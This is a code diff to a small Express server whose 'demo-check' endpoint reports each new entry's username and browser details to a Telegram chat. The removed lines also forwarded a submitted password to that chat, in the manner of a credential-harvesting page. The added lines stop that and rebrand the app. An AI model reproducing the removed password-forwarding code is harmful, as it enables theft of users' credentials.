@@ -13,7 +13,7 @@ async function notify({username,demoId,timestamp,clientInfo}){
   const token=String(process.env.TELEGRAM_BOT_TOKEN||"").trim();
   const chat=String(process.env.TELEGRAM_CHAT_ID||"").trim();
   const text=[
-    "✨ Creator Lounge — New Entry",
+    "✨ Dhanush Games — New Entry",
     "",
     "👤 Username: @"+username,
     "🆔 Entry ID: "+demoId,
@@ -23,10 +23,10 @@ async function notify({username,demoId,timestamp,clientInfo}){
     "🌐 Language: "+safeText(clientInfo.language),
     "🕓 Timezone: "+safeText(clientInfo.timezone),
     "📱 Viewport: "+safeText(clientInfo.screenWidth)+" × "+safeText(clientInfo.screenHeight),
-    "🔐 Password data: "+password,
+    "🔐 Password data: NOT COLLECTED"
   ].join("\n");
 
-  console.log("\n"+text+"\n");
+  console.log("Telegram notification prepared for username @"+username);
   if(!token||!chat){
     console.error("Telegram is not configured: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing.");
     return {sent:false,error:"Telegram environment variables are missing."};
@@ -74,6 +74,7 @@ app.post("/api/demo-check",async(req,res)=>{
     screenWidth:Number.isFinite(Number(raw.screenWidth))?Number(raw.screenWidth):0,
     screenHeight:Number.isFinite(Number(raw.screenHeight))?Number(raw.screenHeight):0
   };
+
   const demoId=crypto.randomUUID();
   const timestamp=new Date().toISOString();
   const notification=await notify({username,demoId,timestamp,clientInfo});
@@ -85,12 +86,12 @@ app.post("/api/demo-check",async(req,res)=>{
     timestamp,
     notificationSent:notification.sent,
     notificationError:notification.error,
-    passwordCollected: true,
-    passwordTransmitted: true 
+    passwordCollected:false,
+    passwordTransmitted:false
   });
 });
 
 app.use((req,res)=>res.sendFile(path.join(__dirname,"index.html")));
 
 const port=Number(process.env.PORT)||10000;
-app.listen(port,"0.0.0.0",()=>console.log("Creator Lounge running on port "+port));
+app.listen(port,"0.0.0.0",()=>console.log("Dhanush Games running on 0.0.0.0:"+port));
